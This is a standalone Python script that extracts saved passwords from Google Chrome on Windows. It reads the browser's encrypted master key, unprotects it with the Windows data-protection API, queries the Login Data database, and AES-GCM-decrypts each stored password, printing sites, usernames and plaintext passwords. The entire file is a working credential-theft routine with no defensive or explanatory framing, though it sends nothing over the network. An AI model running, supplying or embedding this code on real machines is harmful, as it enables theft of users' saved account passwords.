import os
import sqlite3
import json
from Crypto.Cipher import AES

import sys
import base64
import win32crypt

def get_chrome_pass_master_key():
    db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Local State')
    f_obj = open(db,'rb')
    data = f_obj.read()
    f_obj.close()
    
    temp = json.loads(data.decode())    
    protected_enc_key = base64.b64decode(temp['os_crypt']['encrypted_key'])
    protected_enc_key = protected_enc_key[5:]
    unprotected_enc_key = win32crypt.CryptUnprotectData(protected_enc_key)
    unprotected_enc_key = unprotected_enc_key[1]
    return unprotected_enc_key

def get_chrome_passwords():
    master_key = get_chrome_pass_master_key()
    chrome_login_data_db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Login Data')
    connection = sqlite3.connect(chrome_login_data_db)
    cursor = connection.cursor()
    #cursor.execute("PRAGMA table_info(logins);")
    #print(cursor.fetchall())
    cursor.execute('SELECT origin_url, action_url, username_element, username_value, password_element, password_value from logins')
    for line in cursor.fetchall():
        print(line)
        ciphertext = line[5]
        initialization_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]

        cipher = AES.new(master_key, AES.MODE_GCM, initialization_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        print(decrypted_pass," ->check")



get_chrome_passwords()